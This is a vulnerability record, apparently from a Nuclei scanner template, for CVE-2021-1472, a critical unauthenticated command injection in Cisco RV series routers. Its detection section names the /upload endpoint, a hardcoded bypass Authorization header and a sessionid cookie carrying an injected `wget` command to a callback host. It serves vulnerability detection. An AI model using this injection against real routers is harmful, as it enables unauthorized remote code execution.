---
cve_id: CVE-2021-1472
template_path: nuclei-templates/http/cves/2021/CVE-2021-1472.yaml
affected_product: Cisco Small Business RV Series
severity: critical
authentication: none
external_callback: true
affected_versions: RV16X/RV26X versions 1.0.01.02 and before and RV34X versions 1.0.03.20 and before
preconditions: []
poc_classification: rce
---

## Vulnerability
Cisco Small Business RV Series routers RV16X/RV26X versions 1.0.01.02 and before and RV34X versions 1.0.03.20 and before contain multiple OS command injection vulnerabilities in the web-based management interface. A remote attacker can execute arbitrary OS commands via the sessionid cookie or bypass authentication and upload files on an affected device. Successful exploitation leads to unauthorized remote code execution, compromising the confidentiality, integrity, and availability of the affected device. CVSS 3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-287, CWE-119.

## PoC / Detection
Classification: rce

The template sends a single POST request to `/upload` containing a multipart/form-data payload (config upload fields) and a `sessionid` cookie with the embedded command injection `` `wget http://{{interactsh-url}}` `` together with a hardcoded `Authorization: QUt6NkpTeTE6dmk4cW8=` header. It detects successful exploitation by confirming an HTTP out-of-band interaction on interactsh and the presence of the string `"jsonrpc":` in the response body.

## References
- https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/
- https://packetstormsecurity.com/files/162238/Cisco-RV-Authentication-Bypass-Code-Execution.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-1472
- https://nvd.nist.gov/vuln/detail/CVE-2021-1473
- http://seclists.org/fulldisclosure/2021/Apr/39
